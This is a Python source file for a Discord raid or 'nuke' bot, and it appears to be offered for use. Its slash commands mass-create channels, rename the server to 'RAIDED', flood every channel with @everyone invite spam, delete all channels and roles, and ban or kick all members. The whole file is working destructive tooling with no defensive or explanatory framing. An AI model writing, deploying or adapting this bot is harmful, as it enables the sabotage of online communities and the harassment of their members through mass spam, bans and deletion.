import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='/', intents=intents)

@bot.event
async def on_ready():
    print(f'✅ {bot.user} is ready!')
    print(f'Connected to {len(bot.guilds)} servers')
    await bot.tree.sync()
    print('Commands synced!')

@bot.tree.command(name="raid", description="FULL SERVER RAID - NUKE EVERYTHING")
async def raid(interaction: discord.Interaction):
    """FULL RAID - 30 CHANNELS, RENAME, MASS SPAM"""
    await interaction.response.send_message("🔥 RAID INITIATED", ephemeral=True)
    
    spam_text = "@everyone https://discord.gg/yourlink"
    
    # PHASE 1: CREATE 30 CHANNELS
    await interaction.followup.send("📝 Creating 30 channels...", ephemeral=True)
    create_tasks = []
    for i in range(30):
        task = interaction.guild.create_text_channel(f"raided")
        create_tasks.append(task)
    
    await asyncio.gather(*create_tasks, return_exceptions=True)
    
    # PHASE 2: RENAME SERVER
    await interaction.followup.send("✏️ Renaming server...", ephemeral=True)
    try:
        await interaction.guild.edit(name="RAIDED")
    except:
        pass
    
    # PHASE 3: SPAM ALL CHANNELS
    await interaction.followup.send("💬 Spamming all channels...", ephemeral=True)
    all_channels = [ch for ch in interaction.guild.text_channels 
                   if ch.permissions_for(interaction.guild.me).send_messages]
    
    spam_tasks = []
    for channel in all_channels:
        for _ in range(50):
            spam_tasks.append(channel.send(spam_text))
    
    await asyncio.gather(*spam_tasks, return_exceptions=True)
    
    await interaction.followup.send("✅ RAID COMPLETE", ephemeral=True)

@bot.tree.command(name="spam", description="SPAM MESSAGES IN CURRENT CHANNEL")
async def spam(interaction: discord.Interaction, message: str, amount: int = 100):
    """SPAM MESSAGES"""
    await interaction.response.send_message(f"💬 Spamming {amount} messages...", ephemeral=True)
    
    tasks = []
    for _ in range(amount):
        tasks.append(interaction.channel.send(message))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await interaction.followup.send("✅ Spam complete", ephemeral=True)

@bot.tree.command(name="nuke", description="DELETE ALL CHANNELS")
async def nuke(interaction: discord.Interaction):
    """DELETE ALL CHANNELS"""
    await interaction.response.send_message("💣 NUKING SERVER...", ephemeral=True)
    
    tasks = [channel.delete() for channel in interaction.guild.channels 
             if channel.permissions_for(interaction.guild.me).manage_channels]
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await interaction.followup.send("✅ Nuke complete", ephemeral=True)

@bot.tree.command(name="masschannel", description="CREATE MASS CHANNELS")
async def masschannel(interaction: discord.Interaction, name: str, amount: int = 50):
    """CREATE MASS CHANNELS"""
    await interaction.response.send_message(f"📝 Creating {amount} channels...", ephemeral=True)
    
    tasks = [interaction.guild.create_text_channel(name) for _ in range(amount)]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await interaction.followup.send(f"✅ Created {amount} channels", ephemeral=True)

@bot.tree.command(name="rename", description="RENAME SERVER")
async def rename(interaction: discord.Interaction, name: str):
    """RENAME SERVER"""
    try:
        await interaction.guild.edit(name=name)
        await interaction.response.send_message(f"✅ Server renamed to: {name}")
    except Exception as e:
        await interaction.response.send_message(f"❌ Failed: {str(e)}", ephemeral=True)

@bot.tree.command(name="deleteroles", description="DELETE ALL ROLES")
async def deleteroles(interaction: discord.Interaction):
    """DELETE ALL ROLES"""
    await interaction.response.send_message("🗑️ Deleting roles...", ephemeral=True)
    
    tasks = []
    for role in interaction.guild.roles:
        if role != interaction.guild.default_role and role < interaction.guild.me.top_role:
            tasks.append(role.delete())
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await interaction.followup.send("✅ Roles deleted", ephemeral=True)

@bot.tree.command(name="massban", description="BAN ALL MEMBERS")
async def massban(interaction: discord.Interaction):
    """BAN ALL MEMBERS"""
    await interaction.response.send_message("🔨 Mass banning...", ephemeral=True)
    
    tasks = []
    for member in interaction.guild.members:
        if member != interaction.user and member.top_role < interaction.guild.me.top_role:
            tasks.append(member.ban(reason="Mass ban"))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await interaction.followup.send("✅ Mass ban complete", ephemeral=True)

@bot.tree.command(name="masskick", description="KICK ALL MEMBERS")
async def masskick(interaction: discord.Interaction):
    """KICK ALL MEMBERS"""
    await interaction.response.send_message("👢 Mass kicking...", ephemeral=True)
    
    tasks = []
    for member in interaction.guild.members:
        if member != interaction.user and member.top_role < interaction.guild.me.top_role:
            tasks.append(member.kick(reason="Mass kick"))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await interaction.followup.send("✅ Mass kick complete", ephemeral=True)

# USER TOKEN INSERTED HERE BY LAUNCHER
bot.run('PUT_YOUR_BOT_TOKEN_HERE')
